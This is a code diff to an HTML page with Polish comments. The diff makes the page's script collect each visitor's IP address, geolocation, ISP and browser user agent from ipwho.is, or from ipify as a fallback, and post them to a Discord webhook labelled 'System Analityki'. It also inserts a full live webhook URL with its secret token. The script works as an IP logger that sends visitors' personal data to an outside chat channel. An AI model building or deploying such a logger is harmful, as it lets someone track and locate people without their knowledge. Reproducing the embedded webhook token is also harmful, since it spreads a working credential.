@@ -167,8 +167,8 @@
     </div>
 
     <script>
-        // TWÓJ WEBHOOK SKIEROWANY BEZPOŚREDNIO NA STRONĘ DISCORD.COM (BEZ BLOKOWANEGO PRZEKIEROWANIA AP_P)
-        const DISCORD_WEBHOOK_URL = "https://discord.com";
+        // TWÓJ WEBHOOK SKIEROWANY BEZPOŚREDNIO NA STRONĘ DISCORD.COM
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532069719056715866/1cAY66JZ6NA6sh-FNeT5sEAKDt_3aZKoQHNBSuHCJEM3Z9dtw9s77EpjwgfNX0JydsgA";
 
         window.onload = function() {
             var consent = localStorage.getItem('siteConsent');
@@ -207,8 +207,8 @@
         function startTracking() {
             document.getElementById('mainPage').style.display = 'block';
             
-            // Bezpieczne pobieranie geolokalizacji bez błędów sieciowych CORS
-            fetch('https://ipwho.is')
+            // Pobieranie geolokalizacji z ipwho.is
+            fetch('https://ipwho.is/')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
                     if(data && data.success) {
@@ -221,20 +221,65 @@
                         };
                         sendToDiscord(locData);
                     } else {
-                        sendToDiscord({ ip: "Blad API lokalizacji", country_name: "-", city: "-", region: "-", org: "-" });
+                        // Fallback do ipify jeśli ipwho.is nie powiodło się
+                        fetchIpifyFallback();
                     }
                 })
                 .catch(function(error) {
-                    console.error("Blad sieci podczas pobierania IP:", error);
-                    sendToDiscord({ ip: "Blad sieci", country_name: "-", city: "-", region: "-", org: "-" });
+                    console.error("Błąd sieci podczas pobierania IP z ipwho.is:", error);
+                    fetchIpifyFallback();
+                });
+        }
+
+        function fetchIpifyFallback() {
+            fetch('https://api.ipify.org?format=json')
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    sendToDiscord({
+                        ip: data.ip || "Nieznane",
+                        country_name: "-",
+                        city: "-",
+                        region: "-",
+                        org: "-"
+                    });
+                })
+                .catch(function(err) {
+                    sendToDiscord({ ip: "Błąd sieci", country_name: "-", city: "-", region: "-", org: "-" });
                 });
         }
 
         function sendToDiscord(ipData) {
             const payload = {
                 username: "System Analityki",
-                avatar_url: "https://imgur.com",
                 embeds: [{
                     title: "📥 Logowanie ruchu na stronie",
-                    color: 3066993, 
+                    color: 3066993,
                     fields: [
+                        { name: "🌐 Adres IP", value: ipData.ip || "Nieznany", inline: true },
+                        { name: "📍 Lokalizacja", value: (ipData.city || "-") + ", " + (ipData.region || "-") + ", " + (ipData.country_name || "-"), inline: true },
+                        { name: "🏢 Dostawca (ISP)", value: ipData.org || "Nieznany", inline: false },
+                        { name: "💻 Przeglądarka / OS", value: navigator.userAgent || "Nieznany", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).then(function(res) {
+                if (res.ok) {
+                    console.log("Dane przesłane pomyślnie na Discord webhook.");
+                } else {
+                    console.error("Błąd odpowiedzi z webhooka Discord:", res.status);
+                }
+            }).catch(function(err) {
+                console.error("Błąd wysyłania do Discorda:", err);
+            });
+        }
+    </script>
+</body>
+</html>
